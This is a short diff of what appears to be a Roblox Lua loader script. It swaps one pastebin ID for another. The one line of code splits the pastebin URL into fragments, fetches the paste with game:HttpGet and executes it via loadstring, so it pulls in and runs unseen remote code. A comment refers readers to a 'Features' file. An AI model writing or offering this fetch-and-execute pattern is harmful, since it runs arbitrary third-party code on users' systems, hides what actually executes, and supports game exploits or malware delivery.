@@ -1,2 +1,2 @@
-local _="https://pastebin"local __=".com/raw/"local ___="PKwTTUpB"(loadstring or load)(game:HttpGet(_..__..___))()
+local _="https://pastebin"local __=".com/raw/"local ___="5PSVERyj"(loadstring or load)(game:HttpGet(_..__..___))()
 -- Visit the file "Features" and you will see the details of the script, thank you!
